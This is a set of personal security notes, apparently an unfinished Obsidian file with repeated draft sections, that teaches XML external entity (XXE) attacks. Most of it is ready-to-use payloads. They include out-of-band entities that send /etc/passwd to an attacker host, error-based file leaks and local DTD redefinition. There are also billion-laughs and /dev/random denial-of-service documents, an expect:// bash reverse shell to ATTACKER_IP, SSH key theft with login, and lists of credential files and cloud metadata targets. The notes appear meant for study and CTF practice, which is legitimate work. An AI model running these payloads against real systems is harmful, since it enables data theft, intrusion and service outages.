---
created: 2026-05-07
---
Repurposing local DTDs

Some applications only allow you to include DTDs from a local filesystem (not from external URLs). But you can still exploit it:

1. Enumerate local DTD files
	- Many servers store DTD files on disk (e.g., DocBook, XML schemas, GNOME help files). 
	- Test common DTD paths and observe error messages:

```
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
```

>[!note]+ Common local DTD locations
> ```
> /usr/share/yelp/dtd/docbookx.dtd (GNOME systems)
> /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
> /usr/share/xml/fontconfig/fonts.dtd
> /usr/local/app/schema.dtd (application-specific)
> Windows: C:\Windows\System32\wbem\xml\cim20.dtd
> ```

2. **Find an entity you can redefine**
	- Once you found a valid DTD, examine it source (might be exposed in open-source repositories) to find parameter entity names.
	- Alternatively, you can try to enumerate common entity names.

3. **Build a hybrid DTD payload**
	- A **hybrid DTD** is one that combines an internal DTD (your payload) with external one (the local file you want to retrieve).
	
```XML
<!DOCTYPE message [ 
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  '>
  %local_dtd;
]>

```

- XML allows parameter entities to be **redefined** if redefinition occurs in **internal subset** and original is in **external subset**.
- Your redefinition executes when local DTD loads.
- Error messages leak file contents.

A breakdown of what's going on:
- `<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">`  
    Loads the local DTD file.
- `<!ENTITY % custom_entity ' ... '>`  
    Redefines `%custom_entity` (which must exist in the external DTD) with your malicious payload.
- Inside the redefinition:
    - `<!ENTITY % file SYSTEM "file:///etc/passwd">`  
        Reads `/etc/passwd` into `%file`.
    - `<!ENTITY % eval ...>`  
        Dynamically defines `%error` to try loading a file named `/nonexistent/%file;`, which will not exist.
    - `%eval; %error;`  
        Expands the entities: the parser tries to load a file with a name that includes the contents of `/etc/passwd`.
- `%local_dtd;`  
    Expands the external DTD, which now uses your redefined `%custom_entity`.





The advantage of `XInclude` over traditional XXE is that **`XInclude` elements can be injected anywhere in an XML document, not just in the DTD**.

The consequences of such exploitation are same as these of classic XXE: LFI, SSRF, OOB data exfiltration, and DoS.

>[!example]+
> ```XML
> <?xml version="1.0"?>
> <root xmlns:xi="http://www.w3.org/2001/XInclude">
>   <xi:include href="file:///etc/passwd" parse="text"/>
> </root>
> ```
> - The `xi:include` element references the `/etc/passwd` file with `parse="text"` specified, which tells the parser to read the file as plain text rather than XML. 
> - The file contents are then included in the resulting document.

>[!note] Even when external DTDs are blocked, there's a chance **`XInclude` has been overlooked**.

>[!note] `XInclude` can be combined with classical XXE attacks for more complex exploitation, since each document included with `XInclude` can itself be a valid XML document with its own `DOCTYPE`.


---

> **XInclude (XML Inclusions)** is a W3C specification (`http://www.w3.org/2001/XInclude`) that defines an `<xi:include>` element
> 
allows an XML parser to assemble composite documents by fetching and merging external XML or text resources into the parent document at parse time.

XInclude attacks are significant because they do not require injecting a `DOCTYPE` declaration. Wherever an attacker can inject arbitrary XML elements — even deeply nested within a document — an `<xi:include>` element will be processed by a supporting parser:

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

The `parse="text"` attribute instructs the processor to include the resource as character data rather than XML. Without it, the processor attempts to parse the file as XML, which fails for non-XML files.

XInclude is useful when:

- The application wraps attacker-supplied data in its own XML structure (making DTD injection impossible because `DOCTYPE` must precede the root element)
- The application strips `DOCTYPE` declarations from input but processes `<xi:include>` elements
- Server-side XML assembly pipelines include fragments from user-supplied content
### Port scanning via XXE

- SSRF via XXE can be used to **scan ports** on internal hosts the target server can connect to:

```Python
import requests

# vulnerable endpoint
target_url = "https://example.com/api/xml"
internal_ip = "192.168.1.100" # target IP address to port-scan
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080] # ports to scan

for port in ports:
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://{internal_ip}:{port}/">
]>
<root>&xxe;</root>'''
    
    try:
        start_time = time.time()
        response = requests.post(target_url, data=payload, timeout=5)
        elapsed = time.time() - start_time
        
        # connection refused errors suggest the port is closed
        # connection accepted but empty response suggests port is open
        if "Connection refused" not in response.text and "not found" not in response.text.lower():
            print(f"[+] Port {port} may be open - Response time: {elapsed:.2f}s")
        elif elapsed < 0.5:
            print(f"[-] Port {port} likely closed - Response time: {elapsed:.2f}s")
        else:
            print(f"[?] Port {port} uncertain - Response time: {elapsed:.2f}s")
    except requests.Timeout:
        print(f"[*] Port {port} - Connection timeout (possibly filtered)")
    except Exception as e:
        print(f"[!] Port {port} - Error: {str(e)}")
```

The timing of responses is significant: 
- Responses to open ports typically return quickly with some response content
- Attempts to connect to closed ports may result in `Connection refused` errors
- Attempts to connect to filtered ports may just timeout
## Blind XXE: extracting data OOB

>**Blind XXE** occurs when an application is vulnerable to XXE injection but **does not return any contents** in responses.

It's still possible to retrieve data with blind XXE, but you have to rely on **OOB (Out-of-Band)** network interactions.

>[!note] This scenario is quite common in production environments.
### OOB data exfiltration

It might be possible to make the target server send data to a server you control. If you can't retrieve the data via an application response, try putting it in your own server logs!

This technique exploits the ability of an XML parser to trigger HTTP/DNS requests. You make the target server request a URL from your server that includes the data from the file you're trying to read as a parameter:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'http://ATTACKER_IP_ADDRESS:8000/?data=%file;'>">
  %eval;
  %oob;
]>
```

What happens:

1. `%file` reads `/etc/passwd`.
2. `%eval` injects a new entity: `<!ENTITY % oob SYSTEM 'http://ATTACKER_IP_ADDRESS:8000/?data=...'>`
3. When `%eval;` expands, the `%oob` entity is created with the file content in the URL
4. When `%oob;` expands, the server makes an HTTP request: `GET /?data=root:x:0:0:root:/root:/bin/bash...`. **You see the data in your server logs.**

You're not relying on the application to return anything — you're just monitoring incoming requests to your server.
#### Th newline problem and possible solutions

Files that contain **newline characters (`\n`)** may cause the exfiltration to fail because:
- Newlines can't be sent in URLs without encoding.
- Many XML parsers reject URLs with certain special characters, including newlines.
- HTTP libraries may truncate or reject malformed URLs.

Possible solutions:
- Use PHP Base64 filter to encode the file first:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'http://ATTACKER_IP_ADDRESS:8000/?data=%file;'>">
  %eval;
  %oob;
]>
```

- Target files without newlines, e.g., `/etc/hostname`.
- Use alternative protocols, such as FTP (`ftp://`) or Gopher (`gopher://`):

```XML
<!ENTITY % oob SYSTEM "ftp://ATTACKER_IP_ADDRESS:21/?data=%file;">
```

- Use PHP filter wrapper to Base64-encode the content (discussed below).
- Use error-based exfiltration for smaller files.

You can even create a PHP server that automatically decodes Base64-encoded parameters:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
cat > index.php << 'EOF'
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
EOF
php -S 0.0.0.0:8000
```

```bash
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP_ADDRESS:8000/?data=%file;'>">
EOF
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP_ADDRESS:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
	<email>
		&content;
	</email>
</root>
```

![[exfiltrate_etc_passwd.png]]

![[finding_flag.png]]
### Automated OOB exfiltration

In many cases, it's convenient to delegate exploitation to automated tools. One of such is [`XXEinjector`](https://github.com/enjoiz/XXEinjector).

>[!note]+ Installation
>```bash
>git clone https://github.com/enjoiz/XXEinjector.git
>```

## Billion Laughs

If entity expansion limits are unset, it might be possible to inject **exponential entity expansion** that causes massive memory/CPU consumption and eventually **crashes the server**. It is a **DoS (Denial of Service)** attack known as the **Billion Laughs**.

Here is a classic example:

```XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Let's break this bad joke down:
- The entity `lol` is `"lol"` = 3 characters.
- `lol1` is 10 repetitions of `lol` → 10 "lol" = 30 characters.
- `lol2` is 10 repetitions of `lol1` → 100 "lol" = 300 characters.
- `...`
- `lol9` is $10^9$ repetitions of `lol` → ~1 billion "lol" = **~3 billion characters** (~3 GB of memory).

>[!note] The name "Billion Laughs" comes from the common example where the first entity is the string `"lol"`, which expands exponentially to about a billion "lol" strings. 
>:D
### Quadratic blowup

Quadratic blowup is a variation of the Billion Laughs attack that uses quadratic entity expansion instead of exponential expansion:

```XML
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
]>
<bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>
```

This is less dramatic than exponential expansion but more reliable against parsers that have limits on entity expansion depth.

### External entity-based DoS

Alternatively, you can leverage external entities that reference files like `/dev/urandom`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dos [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<dos>&xxe;</dos>
```

On Unix systems, `/dev/random` is an infinite stream of random data. When the parser attempts to read this as an entity, it will consume resources trying to parse an infinite stream until it runs out of memory or file descriptors.

## XXE through XSLT

>**[XSLT (Extensible Stylesheet Language Transformations)](https://en.wikipedia.org/wiki/XSLT)** is used to transform and format XML documents.

XSLT can inadvertently enable XXE exploitation if the application processes user-controlled XSLT stylesheets.

>[!example]+
> 
> ```xml
> <?xml version="1.0"?>
> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
>   <xsl:import href="file:///etc/passwd"/>
> </xsl:stylesheet>
> ```

>[!example]+
> Some XSLT processors support document functions that can read external resources:
> 
> ```xml
> <?xml version="1.0"?>
> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
>   <xsl:template match="/">
>     <xsl:value-of select="document('file:///etc/passwd')"/>
>   </xsl:template>
> </xsl:stylesheet>
> ```

## From XXE to RCE

In some cases, XXE can be used to gain RCE (Remote Code Execution).
- Probably the simplest way is to read SSH keys via XXE LFI, and then connect through SSH. 
- Another option is to give a try to **PHP wrappers**, such as [`expect://`](https://www.php.net/manual/en/wrappers.expect.php):

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY exec SYSTEM "expect://id">
]>
<data>
    <post>
        <post_title>id: &exec;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

- The `<!ENTITY exec SYSTEM "expect://id">` declares an **external general entity** named `exec`.
- When the XML parser processes `&exec;`, it invokes the `expect://` wrapper, which executes the command `id` on the server.
- The command output replaces `&exec;` in the XML content.

>[!note]+ `expect://` wrapper 
>The `expect://` wrapper is a PHP stream wrapper provided by the PECL Expect extension. It allows PHP code to **interact with system processes via a pseudo-terminal (PTY)**.
>Fortunately or not, but this module is **not** enabled by default.
>- See [`Supported Protocols and Wrappers — php.net`](https://www.php.net/manual/en/wrappers.php)

>[!note]+ See [[file_inclusion_#PHP wrappers and LFI to RCE]].


# drafts


>[!tip]+
>Try fuzzing files to see what you can access. You can use wordlist for LFI, such as:
>- [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
>- [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
>- [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt) (Windows)
>
>Some high-value targets for Linux:
> - `/etc/passwd` — User enumeration
> - `/etc/hosts` — Network configuration
> - `/etc/hostname` — System identification (no newlines, excellent for blind XXE)
> - `/proc/self/environ` — Environment variables (may contain credentials and other sensitive information)
> - `/proc/self/cmdline` — Current process's command line
> - `/proc/net/tcp` — Network connections
> - `/proc/net/fib_trie` — Network routes
> - `/var/log/apache2/access.log` — Web server logs (Apache)
> - `/var/www/html/config.php` — PHP configuration
> - `/home/user/.ssh/id_rsa` — SSH private keys
> - `~/.aws/credentials` — Cloud credentials (AWS)
> - `/etc/shadow` — Password hashes (rare, root needed) 
> - `/root/.bash_history` — Command history (rare, root needed)
> 
> ```
> ~/.aws/credentials  
> /etc/hostname  
> /etc/hosts  
> /etc/passwd  
> /etc/shadow  
> /home/user/.ssh/id_rsa  
> /proc/net/fib_trie 
> /proc/net/tcp  
> /proc/self/cmdline  
> /proc/self/environ  
> /root/.bash_history  
> /root/.ssh/id_rsa  
> /var/log/apache2/access.log  
> /var/www/html/config.php
> ```


> [!example]+
> Say, you're trying to print out a Python script:
> 
> ```XML
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE email [
>   <!ENTITY file SYSTEM "file:///var/www/html/script.py">
> ]>
> <email>
>   <content>&file;</content>
> </email>
> ```
> 
> But inside that script, there's a line like `if x < 10 and x > 5:`. The parser will try to interpret `<` and `>` characters as attempted XML tag delimiters, and fail. The `&` in `and` is even more problematic because it starts an entity reference.



>[!warning]+ The challenge with direct CDATA
> You might think this would work:
> 
> ```XML
> <!DOCTYPE root [
>   <!ENTITY file SYSTEM "file:///var/www/html/index.php">
>   <!ENTITY wrapped "<![CDATA[&file;]]>">
> ]>
> <root>
> 	<email>
> 		&wrapped;
> 	</email>
> </root>
> ```
> **It doesn't.** Most XML parsers prevent mixing internal entities (defined in the DTD) with external entities (like `SYSTEM "file://..."`). 
> Entity expansion happens sequentially, and by the time `&file;` would expand, **it's already inside the CDATA string**, which isn't interpreted by the parser but printed literally.

- The challenge is that you can't create CDATA sections directly through entity expansion. The workaround is to use **parameter entities** — special type of entities that starts with a `%` character and can only be used withing the DTD.

>[!warning]+ Internal entities can't be jointed with external entities in most XML parsers.
>This is why the following is unlikely to work:
> 
> ```xml
> <!DOCTYPE root [
>   <!ENTITY start "<![CDATA[">
>   <!ENTITY file SYSTEM "file:///var/www/html/index.php">
>   <!ENTITY end "]]>">
>   <!ENTITY joined "%start;%file;%end;">
> ]>
> <root>
> 	<email>
> 		&joined;
> 	</email>
> </root>
> ```
> - `start` and `end` are **internal entities** that contain start and end of the CDATA section, and `file` is an **external entity** with the contents of the file you want to read. They can't be joined directly like this.

- Although you can't join external and internal parameter entities directly, **you do can join external entities together**. And when all entities are referenced from an external source, they're all treated as external. 
- This means **you can host a DTD on your HTTP server** and refer to it in an **external XML entity**, like this:

```bash
cat > xxe.dtd << 'EOF'
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % end "]]>">
<!ENTITY joined "%start;%file;%end;">
EOF
python3 -m http.server 8000
```

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP_ADDRESS:8000/xxe.dtd">
  %xxe;
]>
<root>
	<email>
		&joined;
	</email>
</root>
```

- The server fetches your external DTD file.
- All parameter entities (`%begin;`, `%file;`, `%end;`) are loaded as external. Because they're all external, they can be combined together.
- The result is equivalent to wrapping the file content in CDATA tags; special characters are treated as literal data, not markup.



# drafts



- To detect XML input entries:
	- Identify requests with `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
	- Check for XML in request bodies (`POST`, `PUT`, `PATCH` methods).
	- Examine URL parameters that may contain encoded XML.
	- Review responses for XML formatting or error messages revealing XML parsing.

Testing workflow:
1. Find a part of an application that processes XML input (e.g., an API endpoint, SOAP web service, XML upload, etc.).

2. Test if the application accepts injected DTDs and processes XML entries. 

3. Test if the application processes external entities. 

4. Check for blind XXE if no response content is returned 

- The reason why XXE vulnerabilities occur can be:
	- Many XML parsers process external entities by default. 
	- Developers sometimes intentionally enable external entity processing to, for example, include external files withing XML.




## LFI via XXE

XML external entities can be used to reference **local files** stored on the target server using the `file://` scheme. This is a **Local File Inclusion (LFI)** attack.

- Start by attempting to read a commonly accessible, non-critical file, such as `/etc/hostname` on Linux systems (which typically contains just a hostname without newlines):

```XML
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE content [ 
	<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]> 
<content>&xxe;</content>
```

- Both `SYSTEM` and `PUBLIC` keywords function nearly identically from the perspective of XXE exploitation, so you can use either of them:

```XML
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE content [ 
	<!ENTITY xxe PUBLIC "file:///etc/passwd"> 
]> 
<content>&xxe;</content>
```

>[!note] This might be useful for evading blacklist-based filters that block the `SYSTEM` keyword in XML.

- Look if file content is reflected anywhere in the application response.
- If the direct inclusion fails, try extracting file contents through error messages (see [[#Exfiltrating data via error messages]]). Another option is to try OOB techniques (see [[#Blind XXE extracting data OOB]]).




>[!note]+ Another `awk` command I wanted to paste here. 
>```
>cat files.txt | awk -F' — ' '{print "`"$1"`" " — " $2}' | sed 's\^\- \1'
>```
>It encloses the first column into backticks and turns the paragraph into a markdown list.

>[!note]+ Directories 
>If you try to reference a directory, you will **usually** get an error (depending on the parser). Some parsers, however, may output directory listings (e.g., JAVA Xerces parser).

### Exfiltrating data via error messages

If you can't retrieve data directly, you can try extracting file contents through **error messages**. For this, you could deliberately reference a non-existent file with *the target file's contents embedded in the path* to trigger an XML parsing error. The application will through an error like `"File '/nonexistent/root:x:0:0:root:/root:/bin/bash<...>' not found"` **with the target data in the error message**.

The key trick is **nested entity injection** — you create an entity whose definition *contains* another entity declaration that references a *non-existent file*.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

What happens:

1. `%file` reads `/etc/passwd` into the parameter entity.
2. `%eval` contains a _string_ that defines a new entity: `<!ENTITY % error SYSTEM 'file:///nonexistent/...'>`.
3. When you reference `%eval;` in the DTD, the XML parser **injects** this string into the DTD, *creating* the `%error` entity definition.
4. When you reference `%error;`, the parser tries to read: `file:///nonexistent/<CONTENTS_OF_PASSWD>`
5. Since that file doesn't exist, the parser throws an error like `"File '/nonexistent/root:x:0:0:root:/root:/bin/bash<...>' not found"`. **Your data is in the error message.**

 >[!note]+ `&#x25;` is the XML-encoded `%` character (needed because `%` is special in DTDs).

>[!tip] If none of the above techniques help, then try [[#OOB data exfiltration]].



>[!tip]+
>- Cloud metadata endpoints are a common target of SSRF attacks:
>
> 
> - **AWS:** `http://169.254.169.254/latest/meta-data/`.
> - **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata:true` header).
> - **GCP:** `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header for most endpoints).
> - **DigitalOcean:** `http://169.254.169.254/metadata/v1`, `v1/id`, `v1/hostname`, `/v1/user-data`.

# Advanced Techniques

### XInclude Injection

> **XInclude (XML Inclusions)** is a W3C specification (`http://www.w3.org/2001/XInclude`) that defines an `<xi:include>` element enabling an XML processor to assemble composite documents by fetching and merging external XML or text resources into the parent document at parse time.

XInclude attacks are significant because they do not require injecting a `DOCTYPE` declaration. Wherever an attacker can inject arbitrary XML elements — even deeply nested within a document — an `<xi:include>` element will be processed by a supporting parser:

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

The `parse="text"` attribute instructs the processor to include the resource as character data rather than XML. Without it, the processor attempts to parse the file as XML, which fails for non-XML files.

XInclude is useful when:

- The application wraps attacker-supplied data in its own XML structure (making DTD injection impossible because `DOCTYPE` must precede the root element)
- The application strips `DOCTYPE` declarations from input but processes `<xi:include>` elements
- Server-side XML assembly pipelines include fragments from user-supplied content

### Local DTD Repurposing

Some environments restrict external HTTP connections but allow local `file://` URIs. Even in these cases, a fully blind environment without OOB capability can sometimes be exploited by repurposing local DTD files already present on the filesystem.

The technique exploits a specific XML rule: a parameter entity defined in an internal DTD subset can **redefine** a parameter entity that was originally defined in an external DTD. This allows an attacker to load a known local DTD and then override one of its parameter entities with a malicious payload.

**Step 1: Enumerate local DTD files**

Test common paths and observe whether error messages change (errors confirming the file was found versus errors about the file not existing):

```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local;
]>
```

Common locations:

```
/usr/share/yelp/dtd/docbookx.dtd          (GNOME/yelp documentation)
/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/etc/xml/docbook-xml/4.5/docbookx.dtd
C:\Windows\System32\wbem\xml\cim20.dtd    (Windows)
```

**Step 2: Find a redefinable parameter entity**

Once you identify a valid local DTD, locate a parameter entity it defines that your payload can redefine. This typically means finding the DTD source online (it is usually open-source) and examining its parameter entity declarations.

**Step 3: Build the hybrid payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>trigger</message>
```

Here `%ISOamso` is a parameter entity defined by the DocBook DTD. By redefining it in the internal subset with a malicious payload, the redefinition executes when `%local_dtd;` is expanded and the original `%ISOamso;` reference within the loaded DTD is hit. The nested error technique then leaks `/etc/passwd` via an error message.

> [!note] The specific entity name to redefine (`ISOamso` in this example) depends entirely on the local DTD in use. Research the DTD's source to find parameter entities that are defined but whose values are safely overridable.

### XSLT-Based XXE

**XSLT (Extensible Stylesheet Language Transformations)** is an XML-based language for transforming XML documents. If an application allows users to supply XSLT stylesheets, and those stylesheets are applied server-side by a processing engine, XXE-class reads can be triggered through XSLT's `document()` function or `<xsl:import>`:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Or using `xsl:import` to trigger file inclusion:

```xml
<xsl:import href="file:///etc/passwd"/>
```

The impact is equivalent to classic XXE — LFI, SSRF, OOB exfiltration — delivered through the XSLT processing path rather than the XML entity path.

### XXE to RCE

Escalating XXE to RCE requires additional primitives. The three most reliable paths:

**1. SSH Key Theft**

Read the private SSH key of a system user via XXE LFI:

```xml
<!ENTITY key SYSTEM "file:///home/www-data/.ssh/id_rsa">
```

If the web application process runs as a user with an SSH key authorized for login, connecting via that key yields an interactive shell:

```bash
# Save the exfiltrated key
echo "-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----" > stolen_key.pem

chmod 600 stolen_key.pem
ssh -i stolen_key.pem www-data@TARGET_IP
```

**2. PHP `expect://` Wrapper**

The PHP `expect://` wrapper executes a system command and returns its output. It requires the PECL `expect` extension, which is not installed by default. When it is available:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY rce SYSTEM "expect://id">
]>
<root>
  <field>&rce;</field>
</root>
```

The parser expands `&rce;` by executing `id` via a pseudo-terminal and substituting the output. This gives direct command execution. Replace `id` with any command, including a reverse shell:

```xml
<!ENTITY rce SYSTEM "expect://bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261'">
```

URL-encode `&` as `%26` in the URI to avoid breaking the entity declaration.

**3. Combined File Read + Deserialization**

In Java applications using XML deserialization (JAX-B, XStream, etc.), reading certain internal configuration files via XXE may expose secrets enabling subsequent deserialization attacks. This is environment-specific but is a realistic escalation path when assessing complex Java-based applications.

---

## Denial of Service via XXE

### Billion Laughs (Exponential Entity Expansion)

> **The Billion Laughs attack** is a denial-of-service attack against XML parsers that exploits recursive entity expansion: a small, syntactically valid XML document causes exponential memory consumption when each entity reference expands into multiple other entity references, ultimately producing output of enormous size.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Each level multiplies by ten. `lol9` expands to 10⁹ repetitions of `"lol"` — approximately three billion characters, or roughly 3 GB of in-memory string data. Most parsers without entity expansion limits will exhaust available heap memory and crash or become unresponsive.

> [!note] The name derives from the string `"lol"` used as the base entity value in the canonical example.

### Quadratic Blowup

Less dramatic but more reliable against parsers with depth limits on recursive expansion:

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<bomb>
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  <!-- repeat hundreds more times -->
</bomb>
```

A single entity of length N referenced M times produces N×M characters. Memory growth is quadratic in the number of references — less violent than exponential expansion but often sufficient to degrade service.

### Infinite Stream

References an infinite or extremely large system resource:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dos [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<dos>&xxe;</dos>
```

On Unix, `/dev/random` generates an endless stream of random bytes. The parser reads indefinitely, consuming file descriptors and memory until the process is killed or the system runs out of resources. `/dev/urandom` produces the same result without blocking.

---

## SSRF via XXE: Internal Network Pivoting

When external entity resolution via HTTP is available, XXE becomes a full SSRF vector. Internal services, administrative interfaces, and cloud metadata endpoints become reachable through the vulnerable server.

### Targeted Internal Service Access

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>
```

Common internal targets:

- `http://localhost/server-status` — Apache server status
- `http://localhost:8080/manager/html` — Tomcat Manager
- `http://127.0.0.1:9200/` — Elasticsearch
- `http://127.0.0.1:6379/` — Redis (protocol mismatch may cause errors, but connection is established)
- `http://127.0.0.1:2375/` — Docker daemon API

### Internal Port Scanning

Response timing and content differences between open, closed, and filtered ports allow blind port scanning of internal hosts:

```python
